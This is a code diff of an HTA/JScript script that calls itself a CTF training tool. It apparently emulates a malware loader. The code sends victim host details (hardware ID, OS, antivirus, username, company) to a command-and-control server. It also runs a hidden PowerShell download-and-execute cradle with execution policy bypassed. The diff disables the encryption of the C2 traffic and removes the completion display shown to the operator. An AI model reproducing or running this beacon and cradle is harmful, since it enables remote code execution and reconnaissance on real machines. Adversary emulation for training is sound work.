@@ -10,7 +10,7 @@
 var LOG_FILE = "C:\\Windows\\Temp\\ctf_training_log.txt";
 //var ARTIFACT_DIR = "C:\\Windows\\Temp\\ctf_artifacts\\";
 var sh = new ActiveXObject("WScript.Shell");
-var ARTIFACT_DIR = sh.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Music";
+var ARTIFACT_DIR = sh.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Music\\";
 
 // --- Utility ---------------------------------------------------
 
@@ -129,7 +129,8 @@ function functionConnectC2(C2Server, HardwareID, BuildID, VictimOS, VictimAV, Vi
         var v78 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
         var C2ConnectPath = "connect?hwid=" + encodeURIComponent(HardwareID) + "&buildId=" + encodeURIComponent(BuildID) + "&os=" + encodeURIComponent(VictimOS) + "&av=" + encodeURIComponent(VictimAV) + "&username=" + encodeURIComponent(VictimUsername) + "&corp=" + encodeURIComponent(VictimCompany);
         v78.Open("POST", C2Server, false);
-        v78.Send(XOREncryptC2Comms(C2ConnectPath));
+        //v78.Send(XOREncryptC2Comms(C2ConnectPath));
+        v78.Send(C2ConnectPath);
         if (v78.Status === 200) {
             return XORDecrypt(v78.ResponseText);
         } else {
@@ -187,7 +188,7 @@ function RunADRecon(sh) {
 function SimulatePowerShellCradle(url) {
     try {
         var sh = new ActiveXObject("WScript.Shell");
-        var cmd = "powershell.exe -ep Bypass -Command \"iex(irm " + url + "/api/getFile/1.mp3\""+ ")\"";
+        var cmd = "powershell.exe -ep Bypass -Command \"iex(irm " + url + ")\"";
         logAction("SimulatePowerShellCradle: " + cmd);
         sh.Run(cmd, 0, false);
     } catch(e) {
@@ -237,15 +238,6 @@ function MAINFnct() {
     logAction("=== CTF TRAINING SESSION COMPLETE ===");
     logAction("Artifacts written to: " + ARTIFACT_DIR);
     logAction("Session token: " + sessionToken);
-
-    // Show completion message to operator
-    var fso = new ActiveXObject("Scripting.FileSystemObject");
-    if (fso.FileExists(LOG_FILE)) {
-        var f = fso.OpenTextFile(LOG_FILE, 1);
-        var contents = f.ReadAll();
-        f.Close();
-        document.getElementById("output").innerText = contents;
-    }
 }
 </script>
 </head>
